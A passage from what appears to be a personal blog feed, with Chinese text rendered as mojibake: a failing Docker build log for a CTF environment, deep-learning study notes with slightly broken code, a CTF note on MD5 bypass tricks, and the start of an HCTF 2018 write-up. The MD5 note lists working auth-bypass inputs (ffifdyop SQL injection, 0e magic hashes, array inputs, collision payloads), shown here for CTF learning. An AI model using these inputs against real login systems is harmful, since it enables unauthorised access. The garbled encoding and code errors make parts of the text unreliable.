class="keyword">for</span> ubuntu:18.10</span><br><span class="line"> ---&gt; 9dc19675e327</span><br><span class="line">Step 2/7 : ENV DOCKER=1 PHANTOMJS_VERSION=<span class="string">&quot;2.1.1&quot;</span></span><br><span class="line"> ---&gt; Running <span class="keyword">in</span> 98e854ac92f3</span><br><span class="line">Removing intermediate container 98e854ac92f3</span><br><span class="line"> ---&gt; 154a521cb653</span><br><span class="line">Step 3/7 : RUN sed -i <span class="string">&#x27;s/http:\/\/archive.ubuntu.com\//http:\/\/mirrors.tuna.tsinghua.edu.cn\//g&#x27;</span> /etc/apt/sources.list &amp;&amp;     sed -i <span class="string">&#x27;/security/d&#x27;</span> /etc/apt/sources.list &amp;&amp;     apt-get -y update &amp;&amp;     apt-get -yqq install curl python3 python3-pip mariadb-server libmysqlclient-dev nginx wget bzip2 libfreetype6 libfontconfig &amp;&amp;     mkdir -p /srv/var &amp;&amp;     wget --local-encoding=UTF-8 --no-check-certificate -O /tmp/phantomjs-<span class="variable">$PHANTOMJS_VERSION</span>-linux-x86_64.tar.bz2 https://bitbucket.org/ariya/phantomjs/downloads/phantomjs-<span class="variable">$PHANTOMJS_VERSION</span>-linux-x86_64.tar.bz2 &amp;&amp;     tar -xjf /tmp/phantomjs-<span class="variable">$PHANTOMJS_VERSION</span>-linux-x86_64.tar.bz2 -C /tmp &amp;&amp;     rm -f /tmp/phantomjs-<span class="variable">$PHANTOMJS_VERSION</span>-linux-x86_64.tar.bz2 &amp;&amp;     mv /tmp/phantomjs-<span class="variable">$PHANTOMJS_VERSION</span>-linux-x86_64/ /srv/var/phantomjs &amp;&amp;     ln -s /srv/var/phantomjs/bin/phantomjs /usr/bin/phantomjs &amp;&amp;     pip3 install django gunicorn mysqlclient requests lxml pyyaml django-simple-captcha</span><br><span class="line"> ---&gt; Running <span class="keyword">in</span> 8d702a730242</span><br><span class="line">Ign:1 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic InRelease</span><br><span class="line">Ign:2 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-updates InRelease</span><br><span class="line">Ign:3 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-backports InRelease</span><br><span class="line">Err:4 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic Release</span><br><span class="line">  404  Not Found [IP: 101.6.15.130 80]</span><br><span class="line">Err:5 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-updates Release</span><br><span class="line">  404  Not Found [IP: 101.6.15.130 80]</span><br><span class="line">Err:6 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-backports Release</span><br><span class="line">  404  Not Found [IP: 101.6.15.130 80]</span><br><span class="line">Reading package lists...</span><br><span class="line">E: The repository <span class="string">&#x27;http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic Release&#x27;</span> does not have a Release file.</span><br><span class="line">E: The repository <span class="string">&#x27;http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-updates Release&#x27;</span> does not have a Release file.                                                               </span><br><span class="line">E: The repository <span class="string">&#x27;http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-backports Release&#x27;</span> does not have a Release file.                                                             </span><br><span class="line">The <span class="built_in">command</span> <span class="string">&#x27;/bin/sh -c sed -i &#x27;</span>s/http:\/\/archive.ubuntu.com\//http:\/\/mirrors.tuna.tsinghua.edu.cn\//g<span class="string">&#x27; /etc/apt/sources.list &amp;&amp;     sed -i &#x27;</span>/security/d<span class="string">&#x27; /etc/apt/sources.list &amp;&amp;     apt-get -y update &amp;&amp;     apt-get -yqq install curl python3 python3-pip mariadb-server libmysqlclient-dev nginx wget bzip2 libfreetype6 libfontconfig &amp;&amp;     mkdir -p /srv/var &amp;&amp;     wget --local-encoding=UTF-8 --no-check-certificate -O /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 https://bitbucket.org/ariya/phantomjs/downloads/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 &amp;&amp;     tar -xjf /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 -C /tmp &amp;&amp;     rm -f /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 &amp;&amp;     mv /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64/ /srv/var/phantomjs &amp;&amp;     ln -s /srv/var/phantomjs/bin/phantomjs /usr/bin/phantomjs &amp;&amp;     pip3 install django gunicorn mysqlclient requests lxml pyyaml django-simple-captcha&#x27;</span> returned a non-zero code: 100</span><br></pre></td></tr></table></figure></li><li><p>è®¸å¤šå‘½ä»¤éƒ½éœ€è¦rootæƒé™ï¼Œå¦‚æœåœ¨å“ªä¸€æ­¥è¿è¡ŒæŠ¥é”™äº†å¯ä»¥æ£€æŸ¥ä»¥ä¸‹æ˜¯å¦æ˜¯æƒé™é—®é¢˜</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Deep Learning from Scratch</title>
      <link href="2021/11/28/deep_learning_from_scratch/"/>
      <url>2021/11/28/deep_learning_from_scratch/</url>
      
        <content type="html"><![CDATA[<h1 id="è¯»ä¹¦è®°å½•"><a href="#è¯»ä¹¦è®°å½•" class="headerlink" title="è¯»ä¹¦è®°å½•"></a>è¯»ä¹¦è®°å½•</h1><a id="more"></a><h2 id="æ”¶è·ï¼š"><a href="#æ”¶è·ï¼š" class="headerlink" title="æ”¶è·ï¼š"></a>æ”¶è·ï¼š</h2><ul><li><p>å¯¹matplotlibã€numpyæœ‰äº†åˆæ­¥è®¤è¯†</p></li><li><p>äº†è§£äº†ä¸€äº›åŸºç¡€æ¦‚å¿µ</p></li><li><p>è·Ÿéšä¹¦æœ¬å®ç°äº†ç®€å•çš„é€»è¾‘é—¨ç”µè·¯</p></li><li><p>è®¤è¯†äº†æ„ŸçŸ¥æœºã€æ¿€æ´»å‡½æ•°</p></li></ul><h3 id="numpy"><a href="#numpy" class="headerlink" title="numpy:"></a>numpy:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">x = np.array([<span class="number">1.0</span>,<span class="number">2.0</span>,<span class="number">3.0</span>]) <span class="comment">#ç”Ÿæˆæ•°ç»„</span></span><br><span class="line">print(x)</span><br><span class="line">print(x.dtype)<span class="comment">#æŸ¥çœ‹æ•°æ®ç±»å‹</span></span><br><span class="line">print(x.shape)<span class="comment">#æŸ¥çœ‹çŸ©é˜µå½¢çŠ¶</span></span><br><span class="line">x = x.flatten()<span class="comment">#å°†çŸ©é˜µè½¬æ¢ä¸ºä¸€ç»´æ•°ç»„</span></span><br></pre></td></tr></table></figure><h3 id="matplotlib"><a href="#matplotlib" class="headerlink" title="matplotlib"></a>matplotlib</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> matplotlib.image <span class="keyword">import</span> imread</span><br><span class="line"></span><br><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">y = [<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>]</span><br><span class="line">plt.plot(x, y)<span class="comment">#ç»˜åˆ¶å›¾å½¢</span></span><br><span class="line">plt.show()<span class="comment">#æ˜¾ç¤ºåæ ‡ç³»</span></span><br><span class="line"></span><br><span class="line">img = imread(<span class="string">&quot;lena.png&quot;</span>)</span><br><span class="line">plt.imshow(img)<span class="comment">#æ˜¾ç¤ºå›¾åƒ</span></span><br></pre></td></tr></table></figure><h3 id="åŸºç¡€æ¦‚å¿µ"><a href="#åŸºç¡€æ¦‚å¿µ" class="headerlink" title="åŸºç¡€æ¦‚å¿µ"></a>åŸºç¡€æ¦‚å¿µ</h3><ul>    <li>å¹¿æ’­ï¼šå°†ä¸çŸ©é˜µç›¸ä¹˜çš„æ ‡é‡è½¬æ¢ä¸ºç›¸åº”å¤§å°çŸ©é˜µçš„åŠŸèƒ½</li>    <li>å¼ é‡ï¼šä¸€èˆ¬åŒ–ä¹‹åçš„å‘é‡æˆ–çŸ©é˜µ</li>    <li>æ„ŸçŸ¥æœºï¼šæ„ŸçŸ¥æœº(perceptron)æ˜¯äºŒç±»åˆ†ç±»çš„çº¿æ€§åˆ†ç±»æ¨¡å‹ï¼Œå…¶è¾“å…¥ä¸ºå®ä¾‹çš„ç‰¹å¾å‘é‡ï¼Œè¾“å‡ºä¸ºå®ä¾‹çš„ç±»åˆ«ã€‚</li></ul><h3 id="ç®€å•é€»è¾‘é—¨çš„å®ç°"><a href="#ç®€å•é€»è¾‘é—¨çš„å®ç°" class="headerlink" title="ç®€å•é€»è¾‘é—¨çš„å®ç°"></a>ç®€å•é€»è¾‘é—¨çš„å®ç°</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AND</span>(<span class="params">x1, x2</span>):</span></span><br><span class="line">    x = np.array([x1, x2])</span><br><span class="line">    w = np.array([<span class="number">0.5</span> <span class="number">0.5</span>])</span><br><span class="line">    b = <span class="number">-0.7</span></span><br><span class="line">    tmp = np.<span class="built_in">sum</span>(w*x) + b</span><br><span class="line">    <span class="keyword">if</span> tmp  &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> tmp &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">NAND</span>(<span class="params">x1, x2</span>):</span></span><br><span class="line">    x = np.array([x1, x2])</span><br><span class="line">    w = np.array([<span class="number">-0.5</span> <span class="number">-0.5</span>])</span><br><span class="line">    b = <span class="number">0.7</span></span><br><span class="line">    tmp = np.<span class="built_in">sum</span>(w*x) + b</span><br><span class="line">    <span class="keyword">if</span> tmp  &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> tmp &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">OR</span>(<span class="params">x1, x2</span>):</span></span><br><span class="line">    x = np.array([x1, x2])</span><br><span class="line">    w = np.array([<span class="number">0.5</span> <span class="number">0.5</span>])</span><br><span class="line">    b = <span class="number">-0.2</span></span><br><span class="line">    tmp = np.<span class="built_in">sum</span>(w*x) + b</span><br><span class="line">    <span class="keyword">if</span> tmp &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> tmp &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">XOR</span>(<span class="params">x1, x2</span>):</span></span><br><span class="line">    s1 = NAND(x1, x2)</span><br><span class="line">    s2 = OR(x1, x2)</span><br><span class="line">    y = AND(s1, s2)</span><br><span class="line">    <span class="keyword">return</span> y</span><br></pre></td></tr></table></figure><h3 id="æ„ŸçŸ¥æœº"><a href="#æ„ŸçŸ¥æœº" class="headerlink" title="æ„ŸçŸ¥æœº"></a>æ„ŸçŸ¥æœº</h3><h4 id="æ„ŸçŸ¥æœºçš„å±€é™æ€§"><a href="#æ„ŸçŸ¥æœºçš„å±€é™æ€§" class="headerlink" title="æ„ŸçŸ¥æœºçš„å±€é™æ€§"></a>æ„ŸçŸ¥æœºçš„å±€é™æ€§</h4><p>â€‹    å•å±‚æ„ŸçŸ¥æœºåªèƒ½è¡¨ç¤ºçº¿æ€§ç©ºé—´</p><h4 id="å¤šå±‚æ„ŸçŸ¥æœºçš„ä¼˜åŠ¿"><a href="#å¤šå±‚æ„ŸçŸ¥æœºçš„ä¼˜åŠ¿" class="headerlink" title="å¤šå±‚æ„ŸçŸ¥æœºçš„ä¼˜åŠ¿"></a>å¤šå±‚æ„ŸçŸ¥æœºçš„ä¼˜åŠ¿</h4><ul><li>å¤šå±‚æ„ŸçŸ¥æœºå¯ä»¥å®ç°éçº¿æ€§ç©ºé—´</li><li>ä½¿ç”¨äº†éçº¿æ€§å‡½æ•°sigmoidä½œä¸ºæ¿€æ´»å‡½æ•°çš„2å±‚æ„ŸçŸ¥æœºå¯ä»¥è¡¨ç¤ºä»»æ„å‡½æ•°</li></ul><h3 id="æ¿€æ´»å‡½æ•°"><a href="#æ¿€æ´»å‡½æ•°" class="headerlink" title="æ¿€æ´»å‡½æ•°"></a>æ¿€æ´»å‡½æ•°</h3><p>å®šä¹‰ï¼šå°†è¾“å…¥ä¿¡å·çš„æ€»å’Œè½¬æ¢ä¸ºè¾“å‡ºä¿¡å·çš„å‡½æ•°</p><ul><li><p>sigmoidå‡½æ•°ï¼š<br>$$<br>h(x) = \frac{1}{(1+e^{-x})}<br>$$</p></li><li><p>é˜¶è·ƒå‡½æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">step_function</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">step_function</span>(<span class="params">x</span>):</span></span><br><span class="line">    y = x &gt; <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> y.astype(np.<span class="built_in">int</span>)</span><br></pre></td></tr></table></figure></li><li><p>ReLUå‡½æ•°<br>$$<br>h(x)=<br>\begin{cases}<br>x    (x&gt;0)\<br>0    (x\leq0)\<br>\end{cases}<br>$$</p></li></ul><ul><li><p>æ’ç­‰å‡½æ•°</p></li><li><p>softmaxå‡½æ•°<br>$$<br>y_k=\frac{e^}{\sum_{i=1}^ne^{a_i}}<br>$$</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> çŸ¥è¯†è¾“å‡ºã€AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æœ‰å…³md5çš„ä¸€äº›ä¿¡æ¯</title>
      <link href="2021/11/23/something_about_md5/"/>
      <url>2021/11/23/something_about_md5/</url>
      
        <content type="html"><![CDATA[<p>åœ¨ctfæ¯”èµ›ä¸­å¸¸å¸¸è§åˆ°md5çš„èº«å½±ï¼Œå¯¹äºmd5ï¼Œå¸¸è§çš„åˆ©ç”¨æ–¹å¼æœ‰ä»¥ä¸‹å‡ ç§<a id="more"></a></p><h3>åœ¨sqlæ³¨å…¥ä¸­</h3><p>è‹¥é‡åˆ°äº†ç±»ä¼¼ä»¥ä¸‹çš„æƒ…å†µ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$password=$_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">$sql = <span class="string">&quot;SELECT * FROM admin WHERE username = &#x27;admin&#x27; and password = &#x27;&quot;</span>.md5($password,<span class="literal">true</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">$result=mysqli_query($link,$sql);</span><br></pre></td></tr></table></figure><p>å¯ä»¥ä¼ å…¥ffifdyopæˆ–è€…129581926211651571912466741651878684928ï¼Œè¿™ä¸¤è€…md5åŠ å¯†åçš„ç»“æœéƒ½åŒ…å« â€˜ OR â€˜ çš„å­—æ ·ï¼Œå¯ç”¨äºå¼•å·é€ƒé€¸</p><h3>åœ¨å¼±ç±»å‹æ¯”è¾ƒä¸­</h3><p>è‹¥å­˜åœ¨å¯¹ä¸¤ä¸ªmd5åŠ å¯†åçš„å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒæ—¶ï¼Œå¯ä¼ å…¥ç±»ä¼¼s1502113478aã€s1836677006açš„å­—ç¬¦ä¸²ï¼ŒåŠ å¯†åéƒ½æ˜¯ä»¥0eå¼€å¤´ï¼Œæ¯”è¾ƒæ—¶éƒ½ä¸ºé›¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&quot;s1502113478a&quot;</span>;</span><br><span class="line">$b = <span class="string">&quot;s1836677006a&quot;</span>;</span><br><span class="line"></span><br><span class="line">$a_1 = md5($a);</span><br><span class="line">$b_1 = md5($b);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $a_1.<span class="string">&quot;\n&quot;</span>.$b_1.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Documents]</span><br><span class="line">â””â”€$ php md5.php </span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">0e481036490867661113260034900752</span><br></pre></td></tr></table></figure><h3>åœ¨å…è®¸ä¼ é€’æ•°ç»„æ—¶</h3><p>å¯ä»¥ä¼ å…¥ä¸¤ä¸ªç©ºæ•°ç»„ï¼Œç”±äºmd5æ— æ³•å¯¹æ•°ç»„è¿›è¡ŒåŠ å¯†ï¼Œæ•…è¿”å›nullï¼Œè€Œ null = null ä¸º true</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span>();</span><br><span class="line">$b = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">$a_1 = md5($a);</span><br><span class="line">$b_1 = md5($b);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $a_1.<span class="string">&quot;\n&quot;</span>.$b_1.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Documents]</span><br><span class="line">â””â”€$ php em_array.php </span><br><span class="line">PHP Warning:  md5() expects parameter 1 to be string, array given <span class="keyword">in</span> /home/kali/Documents/em_array.php on line 5</span><br><span class="line">PHP Warning:  md5() expects parameter 1 to be string, array given <span class="keyword">in</span> /home/kali/Documents/em_array.php on line 6</span><br></pre></td></tr></table></figure><p>è™½ç„¶è½¬æ¢å¤±è´¥ï¼Œä½†æ˜¯è¿”å›äº† null ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨ä¼ é€’æ•°ç»„æ—¶åº”ä½¿ç”¨å¦‚ä¸‹å½¢å¼ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=<span class="number">1</span> &amp; b[<span class="number">1</span>]=<span class="string">&quot;b&quot;</span> &amp; c[]</span><br></pre></td></tr></table></figure><h3>md5ç¢°æ’</h3><p>å½“ä¸Šè¿°æ–¹æ³•éƒ½ä¸å¥æ•ˆæ—¶ï¼šå¯ä»¥ä½¿ç”¨md5ç®—æ³•æœ¬èº«çš„æ¼æ´ï¼›md5ç¢°æ’æŒ‡çš„æ˜¯ä¸åŒçš„è¾“å…¥è¿›è¡Œmd5åŠ å¯†åå¾—åˆ°åŒæ ·çš„è¾“å‡ºï¼Œç½‘ä¸Šæœ‰è®¸å¤šç®—æ³•å¯ä»¥å®ç°ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºè¾“å…¥éœ€ä¸Šä¼ æœåŠ¡å™¨ï¼Œæ•…éœ€è¦å¯¹è¾“å‡ºè¿›è¡Œurlç¼–ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!coding:utf-8</span></span><br><span class="line">hexString1 = <span class="string">&#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&#x27;</span></span><br><span class="line">hexString2 = <span class="string">&#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2&#x27;</span></span><br><span class="line"></span><br><span class="line">hexList1 = []</span><br><span class="line">intList1 = []</span><br><span class="line">asciiString1 =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    intString1 = hexString1[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">    hexString1 = hexString1[<span class="number">2</span>:]</span><br><span class="line">    hexList1.append(intString1)</span><br><span class="line">    <span class="keyword">if</span> (hexString1 == <span class="string">&#x27;&#x27;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hexList1:</span><br><span class="line">    intList1.append(<span class="built_in">int</span>(i,<span class="number">16</span>))</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> intList1:</span><br><span class="line">    asciiString1 += <span class="built_in">chr</span>(<span class="built_in">int</span>(j))</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;1.bin&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(asciiString1)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">hexList2 = []</span><br><span class="line">intList2 = []</span><br><span class="line">asciiString2 =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    intString2 = hexString2[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">    hexString2 = hexString2[<span class="number">2</span>:]</span><br><span class="line">    hexList2.append(intString2)</span><br><span class="line">    <span class="keyword">if</span> (hexString2 == <span class="string">&#x27;&#x27;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hexList2:</span><br><span class="line">    intList2.append(<span class="built_in">int</span>(i,<span class="number">16</span>))</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> intList2:</span><br><span class="line">    asciiString2 += <span class="built_in">chr</span>(<span class="built_in">int</span>(j))</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;2.bin&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(asciiString2)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">urlString1=<span class="string">&#x27;&#x27;</span></span><br><span class="line">urlString2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;1.bin&#x27;</span>):</span><br><span class="line">    urlString1 +=  urllib.parse.quote(line)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;2.bin&#x27;</span>):</span><br><span class="line">    urlString2 +=  urllib.parse.quote(line)</span><br><span class="line"></span><br><span class="line">print(urlString1)</span><br><span class="line">print(urlString2)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HCTF 2018WarmUp 1</title>
      <link href="2021/11/07/%5BHCTF%202018%5DWarmUp%201/"/>
      <url>2021/11/07/%5BHCTF%202018%5DWarmUp%201/</url>
      
        <content type="html"><![CDATA[<p>ä¸€ä¸Šæ¥ä¾¿æ˜¯ä¸€å¼ å¤©çœŸæ— é‚ªçš„ç¬‘è„¸<a id="more"></a><br><a href="https://www.helloimg.com/image/ChSkgt"><img src="https://www.helloimg.com/images/2021/11/07/ChSkgt.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/07/ChSkgt.png" srcset="data:image/png;base64,666" alt="ChSkgt.png"></a><br>æ— å¤´ç»ªï¼Œf12æŸ¥æºç ï¼Œå‘ç°source.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span 